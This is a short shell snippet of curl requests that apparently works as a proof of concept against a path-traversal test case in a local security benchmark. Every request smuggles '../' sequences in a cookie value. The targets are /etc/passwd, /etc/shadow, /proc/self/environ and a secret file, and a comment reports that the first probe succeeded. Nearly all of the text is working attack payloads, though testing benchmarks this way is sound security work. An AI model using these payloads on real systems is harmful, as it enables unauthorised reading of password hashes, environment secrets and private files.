# Step 1: Set the malicious cookie and POST to the endpoint
curl -X POST 'http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00008' \
  -H 'Cookie: BenchmarkTest00008=../../../etc/passwd'

# Response: File 'testfiles/../../../etc/passwd' exists.  (confirming /etc/passwd presence)

# Other probes:
curl -X POST 'http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00008' \
  -H 'Cookie: BenchmarkTest00008=../../../etc/shadow'

curl -X POST 'http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00008' \
  -H 'Cookie: BenchmarkTest00008=../../../proc/self/environ'

curl -X POST 'http://localhost:8443/benchmark/pathtraver-00/BenchmarkTest00008' \
  -H 'Cookie: BenchmarkTest00008=../Secretfile'